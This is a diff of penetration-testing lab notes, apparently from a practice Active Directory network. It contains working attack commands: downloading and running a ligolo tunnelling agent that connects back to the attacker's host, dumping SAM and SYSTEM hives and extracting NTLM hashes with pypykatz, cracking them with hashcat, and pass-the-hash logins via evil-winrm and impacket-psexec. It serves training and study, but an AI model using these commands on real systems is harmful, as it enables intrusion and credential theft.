@@ -83,7 +83,7 @@ copy hashes.kerberoast \\192.168.45.219\smb
 
 # got a couple kerberoastable users
 
-sudo ip route add 10.10.115.0/24 dev ligolo
+sudo ip route add 10.10.84.0/24 dev ligolo
 iwr -uri http://192.168.45.219/agent.exe -Outfile agent.exe
 ./agent.exe -ignore-cert -connect 192.168.45.219:11601
 ```
@@ -296,8 +296,25 @@ iwr -uri http://192.168.45.219/adduser.exe -Outfile MouseServer.exe
 
 .142
 ```
-evil-winrm -i 10.10.115.142 -u celia.almeda -H "e728ecbadfb02f51ce8eed753f3ff3fd"
+evil-winrm -i 10.10.84.142 -u celia.almeda -H "e728ecbadfb02f51ce8eed753f3ff3fd"
 
-iwr -uri http://192.168.45.219/winPEASx64.exe -Outfile winPEAS.exe
-.\winPEAS.exe
+# on this box there's a firewall preventing any file downloads
+# look around in directories and find windows.old a SAM file
+download C:\windows.old\Windows\System32\SAM
+download C:\windows.old\Windows\System32\SYSTEM
+
+pypykatz registry --sam SAM SYSTEM
+
+# tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
+# the has we want to crack is the second one - 4979d69d4ca66955c075c41cf45f24dc
+# 1000 = NTLM hash
+hashcat -m 1000 tomadmin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+.140
+```
+nmap 10.10.84.140
+
+# well pass the hash with tom_admin was easy!
+impacket-psexec -hashes :4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.84.140
 ```
